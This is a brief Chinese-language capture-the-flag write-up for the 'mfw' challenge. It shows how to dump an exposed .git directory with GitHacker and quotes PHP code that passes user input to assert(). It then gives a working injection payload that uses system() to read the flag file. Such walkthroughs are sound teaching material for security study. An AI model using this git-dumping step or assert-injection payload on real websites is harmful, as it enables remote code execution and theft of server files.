

# mfw

* git泄露
``` 
pip install requests
git clone https://github.com/wangyihang/GitHacker.git
python GitHacker.py [Website]

```

* 查看index页面
> assert()函数会将读入的代码当做PHP代码来执行
``` 
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
html代码........

```

* 构造payload, 查看网页源码 
> /?page=%27.system("cat%20templates/flag.php").%27


